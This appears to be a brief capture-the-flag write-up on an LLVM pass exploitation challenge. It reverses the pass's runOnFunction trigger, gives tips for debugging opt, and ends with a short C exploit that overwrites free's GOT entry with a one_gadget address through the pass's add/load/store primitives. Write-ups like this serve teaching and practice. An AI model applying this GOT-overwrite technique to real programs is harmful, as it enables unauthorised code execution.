#  Reversing
Search for vtable to locate the virtual table; the bottommost function is the overridden virtual function runOnFunction
![在这里插入图片描述](/images/csdn/2024/csdn-140048804/image-002-b02e777c97.png)
It checks the function names in the program you are optimizing; if a function named o0o0o0o0 exists, it calls sub_6AC0
![在这里插入图片描述](/images/csdn/2024/csdn-140048804/image-003-b81b8b7b22.png)

# Approach
 ~~PIE is not enabled, so use the arbitrary read/write to overwrite free's GOT entry with a gadget, because the function called by opt optimization will eventually call free~~ 
![在这里插入图片描述](/images/csdn/2024/csdn-140048804/image-007-3bb9cd46cd.png)
That doesn't quite work; what gets called is not the free in the PIE. Use another function's free at the end

opt does not load the .so module at the very beginning; it executes some initialization functions first before loading the .so module.
When debugging, you can set a breakpoint at llvm::Pass::preparePassManager. By the time execution reaches this point, the LLVMHello.so file has already been loaded (or go to main+11507), and we can then set breakpoints inside the LLVMHello.so file based on offsets

# exp
The second argument of add uses 64 bits
![在这里插入图片描述](/images/csdn/2024/csdn-140048804/image-022-f09d71c8ab.png)


```c

void add(int arg1,int arg2);
void load(int arg1);
void store(int arg1);

void o0o0o0o0(){
    add(1,0x77e100);
    load(1); //将free的got表的内容复制给第二个寄存器
    add(2,0x4942e); //free的地址和onegadget的偏移
    add(1,0x870);
    store(1); //修改free的got表的内容

}//0xe3b04 0xe3b01 0000000000006F8F
```
